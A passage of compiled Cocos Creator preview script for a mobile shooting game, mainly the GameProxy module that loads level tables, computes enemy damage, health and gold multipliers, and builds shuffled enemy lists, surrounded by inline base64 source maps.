dyZXNzQmFyLnByb2dyZXNzID0gMTtcclxuICAgICAgICB0aGlzLnRyaXBsZUJ1dHRvbk5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgLy8gdGhpcy5sdWNreVByb2dyZXNzQmFyLnByb2dyZXNzID0gV29ybGQuU3RvcmFnZS5wYXNzTHVja3lDb3VudC81O1xyXG4gICAgICAgIC8vIHRoaXMudHJpcGxlQnV0dG9uTm9kZS5hY3RpdmUgPSBXb3JsZC5TdG9yYWdlLnBhc3NMdWNreUNvdW50IDwgNTtcclxuICAgICAgICB0aGlzLmx1Y2t5QnV0dG9uTm9kZS5hY3RpdmUgPSAhdGhpcy50cmlwbGVCdXR0b25Ob2RlLmFjdGl2ZTtcclxuICAgICAgICBsZXQgc3ByaXRlRnJhbWUgPSB0aGlzLmludml0ZVNwcml0ZUZyYW1lO1xyXG4gICAgICAgIC8vIGlmIChXWEFEVmlkZW8uY2FuUGxheSgpKXtcclxuICAgICAgICAvLyAgICAgc3ByaXRlRnJhbWUgPSB0aGlzLnZpZGVvU3ByaXRlRnJhbWU7XHJcbiAgICAgICAgLy8gfVxyXG4gICAgICAgIHRoaXMubHVja3lWaWRlb1Nwcml0ZS5zcHJpdGVGcmFtZSA9IHNwcml0ZUZyYW1lO1xyXG4gICAgfVxyXG5cclxuICAgIG9uR2FtZU92ZXJUYWtlKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkHZpZGVv44CRNSDlubjov5DlpKflpZYg44CQQ2xpY2vjgJFHYW1lT3ZlciBvbkdhbWVPdmVyVGFrZSBcIiwgZGF0YSlcclxuXHJcbiAgICAgICAgbGV0IG51bSA9IHBhcnNlSW50KGRhdGEpO1xyXG4gICAgICAgIGlmIChudW0gPT0gMSl7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl90YWtlR29sZE9uZSA+IDApe1xyXG4gICAgICAgICAgICAgICAgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgKz0gdGhpcy5fdGFrZUdvbGRPbmU7XHJcbiAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoJ1Nob3dUaXBzQ29tbWFuZCcsIGDph5HluIEgKyR7ZXh0LnNob3J0Rm9ybWF0KHRoaXMuX3Rha2VHb2xkT25lKX1gKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoXCJMb2FkU2NlbmVDb21tYW5kXCIsIFwiSG9tZVNjZW5lXCIpO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgIHRoaXMub25HYW1lT3ZlclRha2VEYWppYW5nKClcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25HYW1lT3ZlclRha2VEYWppYW5nKCl7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5fdmlkZW9TaWduPTVcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLnZpZGVvQWRfc2hvdygpXHJcbiAgICB9XHJcblxyXG4gICAgb25HYW1lT3ZlclRha2VEYWppYW5nRG8oKXtcclxuICAgICAgICBpZiAodGhpcy5sdWNreVByb2dyZXNzQmFyLnByb2dyZXNzID49IDEpe1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcIuW5uOi/kOWkp+Wlli5cIik7XHJcbiAgICAgICAgICAgIHRoaXMuZ2FtZU92ZXJMdWNreS5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIGxldCBudW0gPSBleHQucmFuZG9tRWxlbWVudChbMTAsOSw4LDcsNiw1LDRdKTtcclxuICAgICAgICAgICAgdGhpcy5nYW1lT3Zlckx1Y2t5LnJ1bihudW0sICgpPT57XHJcbiAgICAgICAgICAgICAgICB0aGlzLl92aWRlb011bCA9IG51bTtcclxuICAgICAgICAgICAgICAgIC8vIFdvcmxkLlN0b3JhZ2UucGFzc0x1Y2t5Q291bnQgPSAwO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgbGV0IGdvbGRDb3VudCA9IHRoaXMuX3Rha2VHb2xkT25lKnRoaXMuX3ZpZGVvTXVsO1xyXG4gICAgICAgICAgICAgICAgaWYgKGdvbGRDb3VudCA+IDApe1xyXG4gICAgICAgICAgICAgICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ICs9IGdvbGRDb3VudDtcclxuICAgICAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoJ1Nob3dUaXBzQ29tbWFuZCcsIGDph5HluIEgKyR7ZXh0LnNob3J0Rm9ybWF0KGdvbGRDb3VudCl9YCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoXCJMb2FkU2NlbmVDb21tYW5kXCIsIFwiSG9tZVNjZW5lXCIpO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgZ29sZENvdW50ID0gdGhpcy5fdGFrZUdvbGRPbmUqdGhpcy5fdmlkZW9NdWw7XHJcbiAgICAgICAgaWYgKGdvbGRDb3VudCA+IDApe1xyXG4gICAgICAgICAgICBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCArPSBnb2xkQ291bnQ7XHJcbiAgICAgICAgICAgIEZhY2FkZS5leGVjdXRlQ29tbWFuZCgnU2hvd1RpcHNDb21tYW5kJywgYOmHkeW4gSArJHtleHQuc2hvcnRGb3JtYXQoZ29sZENvdW50KX1gKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoXCJMb2FkU2NlbmVDb21tYW5kXCIsIFwiSG9tZVNjZW5lXCIpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameProxy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9801fpOathEUp/24jFoCzlC', 'GameProxy');
// script/app/game/GameProxy.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.GameProxy = void 0;
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var Extend_1 = require("../../../framework/extend/Extend");
var World_1 = require("../info/World");
var ENEMY_HURT_MUL = 1;
var ENEMY_HP_MUL = 1;
var ENEMY_GOLD_MUL = 1;
var PASS_GOLD_MUL = 1;
var GameProxy = /** @class */ (function () {
    function GameProxy() {
    }
    GameProxy.emit = function (e) {
        var _a;
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        if (this.GameScene) {
            (_a = this.GameScene).emit.apply(_a, __spreadArrays([e], args));
        }
    };
    Object.defineProperty(GameProxy, "level", {
        get: function () {
            return this._level;
        },
        set: function (value) {
            var _a, _b;
            this._level = value;
            console.log("_level===>", this._level);
            var goldUpCfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
            var enemyUpCfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.EnemyUp);
            ENEMY_HURT_MUL = enemyUpCfg[this._level]['enemy_hurt'];
            ENEMY_HP_MUL = enemyUpCfg[this._level]['enemy_health'];
            ENEMY_GOLD_MUL = enemyUpCfg[this._level]['enemy_gold'] * goldUpCfg[World_1.World.Storage.goldLv - 1]['gvalue'];
            PASS_GOLD_MUL = enemyUpCfg[this._level]['clear_gold'];
            var levelConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Level);
            if (this._level <= levelConfig.length - 4) {
                this._levelConfig = levelConfig[this._level - 1];
            }
            else {
                /** 最后四关里随机一关 */
                this._levelConfig = levelConfig[levelConfig.length - 4 + Math.ceil(Math.random() * 100) % 4];
            }
            if (!this._levelConfig) {
                console.error("levelConfig error==>" + this._level);
            }
            /** 生成敌人列表 */
            var enemyArr1 = [], enemyArr2 = [];
            var maxEnemyId1 = 0, maxEnemyId2 = 0;
            var max1 = 0, max2 = 0;
            var enemyID = 1;
            while (typeof this._levelConfig["p1_enemy_" + enemyID] !== "undefined") {
                if (this._levelConfig["p1_enemy_" + enemyID] > 0) {
                    for (var i = 0; i < Math.floor(this._levelConfig["p1_enemy_" + enemyID] * this._levelConfig.amount_p1); i++) {
                        enemyArr1.push(enemyID);
                    }
                    if (this._levelConfig["p1_enemy_" + enemyID] > max1) {
                        max1 = this._levelConfig["p1_enemy_" + enemyID];
                        maxEnemyId1 = enemyID;
                    }
                }
                if (this._levelConfig["p2_enemy_" + enemyID] > 0) {
                    for (var i = 0; i < Math.floor(this._levelConfig["p2_enemy_" + enemyID] * this._levelConfig.amount_p2); i++) {
                        enemyArr2.push(enemyID);
                    }
                    if (this._levelConfig["p2_enemy_" + enemyID] > max2) {
                        max2 = this._levelConfig["p2_enemy_" + enemyID];
                        maxEnemyId2 = enemyID;
                    }
                }
                enemyID++;
            }
            this._levelConfig.amount_p1 = enemyArr1.length;
            this._levelConfig.amount_p2 = enemyArr2.length;
            /** 打乱顺序 */
            Extend_1.ext.shuffle(enemyArr1);
            Extend_1.ext.shuffle(enemyArr2);
            /** 得到敌人列表 */
            this._enemyList.length = 0;
            (_a = this._enemyList).push.apply(_a, enemyArr1);
            for (var i = 0; i < this._levelConfig.p1_boss_7; i++) {
                this._enemyList.push(7);
            }
            for (var i = 0; i < this._levelConfig.p1_boss_8; i++) {
                this._enemyList.push(8);
            }
            (_b = this._enemyList).push.apply(_b, enemyArr2);
            for (var i = 0; i < this._levelConfig.p2_boss_7; i++) {
                this._enemyList.push(7);
            }
            for (var i = 0; i < this._levelConfig.p2_boss_8; i++) {
                this._enemyList.push(8);
            }
            //初始化属性
            this.isOver = false;
            this.killCount = 0;
            this.goldCount = 0;
            this.secondBossNum = this._levelConfig.p2_boss_7 + this._levelConfig.p2_boss_8;
            this._maxEnemyNum = this._enemyList.length;
            this._slowGame = false;
            this._pauseGame = false;
            this.magnetic = false;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameProxy, "levelConfig", {
        get: function () {
            return this._levelConfig;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameProxy, "enemyList", {
        get: function () {
            return this._enemyList;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameProxy, "pauseGame", {
        get: function () {
            return this._pauseGame;
        },
        set: function (value) {
            console.log("GameProxy===>pauseGame", value);
            if (this._pauseGame != value) {
                this._pauseGame = value;
                this.emit(this.Event.PauseGame, this._pauseGame);
            }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameProxy, "slowGame", {
        get: function () {
            return this._slowGame;
        },
        set: function (value) {
            if (this._slowGame != value) {
                this._slowGame = value;
                this.emit(this.Event.SlowGame, this._slowGame);
            }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameProxy, "maxEnemyNum", {
        get: function () {
            return this._maxEnemyNum;
        },
        enumerable: false,
        configurable: true
    });
    /** 敌人伤害公式 */
    GameProxy.enemyHurtMulOf = function (enemyId) {
        return ENEMY_HURT_MUL;
    };
    /** 敌人血量公式 */
    GameProxy.enemyHpMulOf = function (enemyId) {
        return ENEMY_HP_MUL;
    };
    /** 敌人金币产量公式 */
    GameProxy.enemyGoldMulOf = function (enemyId) {
        return ENEMY_GOLD_MUL;
    };
    /** 过关金币公式 */
    GameProxy.passGold = function () {
        return PASS_GOLD_MUL;
    };
    GameProxy.GameScene = null;
    GameProxy.Event = {
        StartGenEnemy: "StartGenEnemy",
        StopGenEnemy: "StopGenEnemy",
        KillEnemy: "KillEnemy",
        KillRole: "KillRole",
        PauseGame: "PauseGame",
        SlowGame: "SlowGame",
        InitGame: "InitGame",
        StartGame: "StartGame",
        ReliveGame: "ReliveGame",
        OverGame: "OverGame",
        UpdateBulletCount: "UpdateBulletCount",
        ShakeScreen: "ShakeScreen",
        PropCDZero: "PropCDZero",
        PropTrigger: "PropTrigger",
    };
    GameProxy.firstAidFlag = true;
    GameProxy.secondBossNum = 0;
    /** 关卡 */
    GameProxy._level = 0;
    /** 关卡配置 */
    GameProxy._levelConfig = null;
    /** 敌人列表 */
    GameProxy._enemyList = [];
    /** 预选枪支 */
    GameProxy.prepareGun = 0;
    /** 是否结束 */
    GameProxy.isOver = false;
    /** 杀敌数 */
    GameProxy.killCount = 0;
    /** 金币数 */
    GameProxy.goldCount = 0;
    /** 金币番倍 */
    GameProxy.goldMul = 1;
    /** 暂停 */
    GameProxy._pauseGame = false;
    /** 磁力道具 */
    GameProxy.magnetic = false;
    /** 变慢 */
    GameProxy._slowGame = false;
    /** 敌人总数 */
    GameProxy._maxEnemyNum = 0;
    return GameProxy;
}());
exports.GameProxy = GameProxy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVByb3h5LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsNkRBQXVFO0FBQ3ZFLHFFQUFrRTtBQUNsRSwyREFBcUQ7QUFDckQsdUNBQW9DO0FBRXBDLElBQUksY0FBYyxHQUFHLENBQUMsQ0FBQztBQUN2QixJQUFJLFlBQVksR0FBRyxDQUFDLENBQUM7QUFDckIsSUFBSSxjQUFjLEdBQUcsQ0FBQyxDQUFDO0FBQ3ZCLElBQUksYUFBYSxHQUFHLENBQUMsQ0FBQztBQUd0QjtJQUFBO0lBaU5BLENBQUM7SUE5TFUsY0FBSSxHQUFYLFVBQVksQ0FBUTs7UUFBRSxjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLDZCQUFPOztRQUN6QixJQUFJLElBQUksQ0FBQyxTQUFTLEVBQUM7WUFDZixDQUFBLEtBQUEsSUFBSSxDQUFDLFNBQVMsQ0FBQSxDQUFDLElBQUksMkJBQUMsQ0FBQyxHQUFLLElBQUksR0FBRTtTQUNuQztJQUNMLENBQUM7SUFTRCxzQkFBVyxrQkFBSzthQUFoQjtZQUNJLE9BQU8sSUFBSSxDQUFDLE1BQU0sQ0FBQztRQUN2QixDQUFDO2FBRUQsVUFBaUIsS0FBYTs7WUFDMUIsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDcEIsT0FBTyxDQUFDLEdBQUcsQ0FBQyxZQUFZLEVBQUUsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDO1lBQ3ZDLElBQUksU0FBUyxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUM7WUFDbEUsSUFBSSxVQUFVLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxPQUFPLENBQUMsQ0FBQztZQUNwRSxjQUFjLEdBQUcsVUFBVSxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxZQUFZLENBQUMsQ0FBQztZQUN2RCxZQUFZLEdBQUcsVUFBVSxD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